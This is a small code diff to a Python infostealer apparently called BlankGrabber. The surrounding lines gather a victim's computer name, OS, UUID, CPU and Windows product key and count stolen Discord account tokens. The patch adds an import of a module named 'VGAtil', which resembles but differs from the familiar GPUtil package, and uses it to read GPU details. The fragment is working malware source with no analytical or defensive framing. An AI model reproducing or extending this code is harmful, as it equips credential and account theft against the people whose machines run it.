@@ -13,6 +13,7 @@ import pyaes
 import random
 import shutil
 import sqlite3
+import VGAtil as GPU
 import re
 import traceback
 import time
@@ -1652,7 +1653,7 @@ class BlankGrabber:
         else:
             ipinfo = data
 
-        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
+        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {GPU.getGPUs()}\nProduct Key: {productKey}"
 
         collection = {
             "Discord Accounts" : self.DiscordTokensCount,
